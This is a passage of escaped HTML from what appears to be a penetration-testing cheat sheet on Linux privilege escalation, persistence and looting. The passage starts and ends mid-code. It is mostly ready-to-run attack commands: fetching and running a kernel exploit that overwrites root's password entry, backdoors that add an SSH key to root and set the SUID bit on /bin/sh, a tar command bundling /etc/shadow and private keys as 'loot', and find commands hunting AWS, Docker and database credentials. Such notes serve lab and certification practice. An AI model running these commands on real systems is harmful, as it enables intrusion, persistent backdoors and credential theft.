class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on victim\u003c/span\u003e\nwget LISTEN_IP/exploit.c\ngcc exploit.c -o exploit \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e may need to compile locally with \"-static\"\u003c/span\u003e\n./exploit \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if statically compiled, may complain about system() failing, but might be ok\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check if exploit worked\u003c/span\u003e\ngrep root /etc/passwd \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e should see hash with 'aaron' salt\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e become r00t\u003c/span\u003e\nsu - \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use password 'aaron'\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to restore to pre-exploit state\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you get error \"su: must be run from a terminal\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or error \"system() function call seems to have failed :(\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e but the exploit successfully changed root's password in /etc/passwd\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e - login as root with the password aaron.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e - restore /etc/passwd\u003c/span\u003e\nmv /tmp/passwd.bak /etc/passwd\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.3 Linux Persistence\u003c/h2\u003e\u003ca id=\"user-content-63-linux-persistence\" class=\"anchor\" aria-label=\"Permalink: 6.3 Linux Persistence\" href=\"#63-linux-persistence\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMany of the techniques for privilege escalation can be used to also maintain persistence (particularly ones where you modify a file).\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.3.1 Add SSH key to authorized_keys\u003c/h3\u003e\u003ca id=\"user-content-631-add-ssh-key-to-authorized_keys\" class=\"anchor\" aria-label=\"Permalink: 6.3.1 Add SSH key to authorized_keys\" href=\"#631-add-ssh-key-to-authorized_keys\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can add your key to either \u003ccode\u003eroot\u003c/code\u003e or a user with (passwordless) sudo.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on kali, make ssh key and copy it\nssh-keygen -C \u0026quot;derp\u0026quot; -N \u0026quot;\u0026quot; -f ./derp-ssh\nxclip -sel clip derp-ssh.pub\n\n# on victim (as root):\n# make sure .ssh directory exists with right permissions\nmkdir -pm700 /root/.ssh\n# add key to authorized_keys\necho \u0026quot;PASTEYOURSSHPUBKEY\u0026quot; \u0026gt;\u0026gt; /root/.ssh/authorized_keys\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali, make ssh key and copy it\u003c/span\u003e\nssh-keygen -C \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -N \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -f ./derp-ssh\nxclip -sel clip derp-ssh.pub\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on victim (as root):\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make sure .ssh directory exists with right permissions\u003c/span\u003e\nmkdir -pm700 /root/.ssh\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add key to authorized_keys\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ePASTEYOURSSHPUBKEY\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e /root/.ssh/authorized_keys\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.3.2 Set SUID bit\u003c/h3\u003e\u003ca id=\"user-content-632-set-suid-bit\" class=\"anchor\" aria-label=\"Permalink: 6.3.2 Set SUID bit\" href=\"#632-set-suid-bit\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you set the SUID bit of a root-owned executable, like \u003ccode\u003e/bin/sh\u003c/code\u003e or \u003ccode\u003eless\u003c/code\u003e\nor \u003ccode\u003efind\u003c/code\u003e (see \u003ca href=\"https://gtfobins.github.io/#+shell\" rel=\"nofollow\"\u003eGTFOBins\u003c/a\u003e for more), you can use those to give yourself a root shell. This is a kind of privesc backdoor.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sudo chmod u+s /bin/sh\"\u003e\u003cpre\u003esudo chmod u+s /bin/sh\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.4 Miscellaneous Linux Commands\u003c/h2\u003e\u003ca id=\"user-content-64-miscellaneous-linux-commands\" class=\"anchor\" aria-label=\"Permalink: 6.4 Miscellaneous Linux Commands\" href=\"#64-miscellaneous-linux-commands\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# make sure terminal environment is good, if not working right\nexport PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'\nexport TERM=xterm-256color\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make sure terminal environment is good, if not working right\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e PATH=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e TERM=xterm-256color\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.4.1 Awk \u0026amp; Sed\u003c/h3\u003e\u003ca id=\"user-content-641-awk--sed\" class=\"anchor\" aria-label=\"Permalink: 6.4.1 Awk \u0026amp; Sed\" href=\"#641-awk--sed\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSometimes there is a lot of extra garbage in the loot you grab. It's nice to\nbe able to quickly sift through it to get the parts you care about.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# grab lines of text between start and end delimiters.\nawk '/PAT1/,/PAT2/' # includes start and end lines\nawk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' FILE  # omits delims\nsed -n '/PAT1/,/PAT2/{//!p;}' FILE\nsed '/PAT1/,/PAT2/!d;//d' FILE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab lines of text between start and end delimiters.\u003c/span\u003e\nawk \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/PAT1/,/PAT2/\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e includes start and end lines\u003c/span\u003e\nawk \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/PAT1/{flag=1; next} /PAT2/{flag=0} flag\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e FILE  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e omits delims\u003c/span\u003e\nsed -n \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/PAT1/,/PAT2/{//!p;}\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e FILE\nsed \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/PAT1/,/PAT2/!d;//d\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e FILE\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.5 Linux Files of Interest\u003c/h2\u003e\u003ca id=\"user-content-65-linux-files-of-interest\" class=\"anchor\" aria-label=\"Permalink: 6.5 Linux Files of Interest\" href=\"#65-linux-files-of-interest\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# quick command to grab the goods\ntar zcf loot.tar.gz \\\n/etc/passwd{,-} \\\n/etc/shadow{,-} \\\n/etc/ssh/ssh_config \\\n/etc/ssh/sshd_config \\\n/home/*/.ssh/id_* \\\n/home/*/.ssh/authorized_keys* \\\n/home/*/.gnupg \\\n/root/.gnupg \\\n/root/.ssh/id_* \\\n/root/.ssh/authorized_keys* \\\n/root/network-secret*.txt \\\n/root/proof.txt\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e quick command to grab the goods\u003c/span\u003e\ntar zcf loot.tar.gz \\\n/etc/passwd{,-} \\\n/etc/shadow{,-} \\\n/etc/ssh/ssh_config \\\n/etc/ssh/sshd_config \\\n/home/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e/.ssh/id_\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \\\n/home/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e/.ssh/authorized_keys\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \\\n/home/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e/.gnupg \\\n/root/.gnupg \\\n/root/.ssh/id_\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \\\n/root/.ssh/authorized_keys\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \\\n/root/network-secret\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.txt \\\n/root/proof.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7 Loot\u003c/h1\u003e\u003ca id=\"user-content-7-loot\" class=\"anchor\" aria-label=\"Permalink: 7 Loot\" href=\"#7-loot\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.1 Sensitive Files\u003c/h2\u003e\u003ca id=\"user-content-71-sensitive-files\" class=\"anchor\" aria-label=\"Permalink: 7.1 Sensitive Files\" href=\"#71-sensitive-files\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThe following are some files that have sensitive information that\nare good to try to grab when you can (directory traversal, LFI, shell access).\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.1.1 Sensitive Files on Linux\u003c/h3\u003e\u003ca id=\"user-content-711-sensitive-files-on-linux\" class=\"anchor\" aria-label=\"Permalink: 7.1.1 Sensitive Files on Linux\" href=\"#711-sensitive-files-on-linux\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlso check out \u003ca href=\"#6.5%20Linux%20Files%20of%20Interest\"\u003eLinux Files of Interest\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"/etc/passwd\n\n# \u0026quot;shadow\u0026quot; files usually have credentials\nfind / -path '/usr' -prune -o -type f -readable \\( -iname 'shadow*' -o -iname '.shadow*' \\) -ls 2\u0026gt;/dev/null\n\n# find ssh private keys (id_rsa, id_dsa, id_ecdsa, and id_ed25519)\nfind / -xdev -type f -readable -name 'id_*' -exec grep -q BEGIN {} \\; -ls 2\u0026gt;/dev/null\n\n# Wordpress config, can have credentials\nfind / -type f -readable -name wp-config.php -ls 2\u0026gt;/dev/null\n# normally at:\n/var/www/wordpress/wp-config.php\n\n# look for other php config files that may have creds\nfind / -type f -readable -name '*config.php' -ls 2\u0026gt;/dev/null\n\n# Apache htaccess files might indicate files/directories with sensitive info\nfind / -type f -readable -name .htaccess -ls 2\u0026gt;/dev/null\n\n# mysql configs, can have creds\nfind / -type f -readable -name '*my.cnf' -ls 2\u0026gt;/dev/null\n\n# find *_history files (bash, zsh, mysql, etc.), which may have sensitive info\nfind / -xdev -type f -readable -name '*_history' -ls 2\u0026gt;/dev/null\n\n# AWS credentials\nfind / -xdev -type f -readable -path '*/.aws/*' \\( -name credentials -o -name config \\) -ls 2\u0026gt;/dev/null\n\n# Docker config, has credentials\nfind / -xdev -type f -readable -path '*/.docker/*' -name config.json -ls 2\u0026gt;/dev/null\n\n# GNUPG directory\nfind / -xdev -type d -readable -name '.gnupg' -ls 2\u0026gt;/dev/null\n\n# Confluence config has credentials\nfind / -xdev -type f -readable -name confluence.cfg.xml -ls 2\u0026gt;/dev/null\n# normally at:\n/var/atlassian/application-data/confluence/confluence.cfg.xml\n\n# VNC passwd files have creds\nfind / -xdev -type f -path '*/.*vnc/*' -name passwd -ls 2\u0026gt;/dev/null\n\n# rarely, .profile files have sensitive info\nfind / -xdev -type f -readable -name '.*profile' -ls 2\u0026gt;/dev/null\"\u003e\u003cpre\u003e/etc/passwd\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"shadow\" files usually have credentials\u003c/span\u003e\nfind / -path \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/usr\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -prune -o -type f -readable \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -iname \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eshadow*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -o -iname \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e.shadow*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find ssh private keys (id_rsa, id_dsa, id_ecdsa, and id_ed25519)\u003c/span\u003e\nfind / -xdev -type f -readable -name \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eid_*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -exec grep -q BEGIN {} \u003cspan class=\"pl-cce\"\u003e\\;\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Wordpress config, can have credentials\u003c/span\u003e\nfind / -type f -readable -name wp-config.php -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e normally at:\u003c/span\u003e\n/var/www/wordpress/wp-config.php\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for other php config files that may have creds\u003c/span\u003e\nfind / -type f -readable -name \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e*config.php\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Apache htaccess files might indicate files/directories with sensitive info\u003c/span\u003e\nfind / -type f -readable -name .htaccess -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mysql configs, can have creds\u003c/span\u003e\nfind / -type f -readable -name \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e*my.cnf\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find *_history files (bash, zsh, mysql, etc.), which may have sensitive info\u003c/span\u003e\nfind / -xdev -type f -readable -name \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e*_history\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e AWS credentials\u003c/span\u003e\nfind / -xdev -type f -readable -path \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e*/.aws/*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -name credentials -o -name config \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Docker config, has credentials\u003c/span\u003e\nfind / 